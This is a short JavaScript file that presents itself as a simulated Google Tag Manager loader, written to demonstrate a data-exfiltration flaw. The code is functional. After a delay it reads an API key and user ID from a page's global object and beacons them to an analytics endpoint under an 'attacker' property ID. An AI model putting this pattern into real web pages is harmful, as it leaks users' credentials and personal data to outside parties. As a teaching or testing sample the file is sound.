/**
 * gtm-loader.js
 *
 * This is a SIMULATED Google Tag Manager loader script to demonstrate a
 * common data exfiltration vulnerability.
 *
 * VULNERABILITY: A misconfigured Custom JavaScript variable in GTM reads a sensitive
 * API key from the global window object and sends it to a third-party analytics endpoint.
 */

(function() {
    console.log('[GTM-SIM] GTM Loader Initialized.');

    // Wait for the main application to populate its global data
    // In a real scenario, this would be tied to a GTM trigger (e.g., DOM Ready).
    setTimeout(() => {
        try {
            if (window.WIZ_global_data && window.WIZ_global_data.PeqOqb) {
                const apiKey = window.WIZ_global_data.PeqOqb;
                const userId = window.WIZ_global_data.S06Grb; // Also grab User ID
                const endpoint = 'https://analytics.google-analytics.com/g/collect'; // Mock endpoint
                
                const analyticsPayload = {
                    v: '2', // GA4 Measurement Protocol version
                    tid: 'G-EXFILTRATION-ID', // Attacker's analytics property ID
                    cid: Date.now().toString() + Math.random().toString(16).substring(2), // Client ID
                    en: 'page_view_with_leaked_data', // Event Name
                    'ep.api_key': apiKey, // <-- CRITICAL DATA LEAKAGE
                    'ep.user_id': userId, // <-- PII LEAKAGE
                    'ep.client_source': 'gtm-simulation-vtf'
                };
                
                const dataString = Object.entries(analyticsPayload)
                  .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
                  .join('&');
                
                // Simulate sending the data to Google Analytics
                console.warn(`[GTM-SIM-VULNERABILITY] Leaking sensitive data to analytics endpoint via sendBeacon. Payload:`, analyticsPayload);
                
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(endpoint, dataString);
                } else {
                    // Fallback for older browsers, though sendBeacon is widely supported
                    const img = new Image();
                    img.src = `${endpoint}?${dataString}`;
                }

            } else {
                console.log('[GTM-SIM] window.WIZ_global_data or PeqOqb not found.');
            }
        } catch (error) {
            console.error('[GTM-SIM] Error during data exfiltration attempt:', error);
        }
    }, 2500); // Wait 2.5 seconds to ensure WIZ_global_data is available from index.html
})();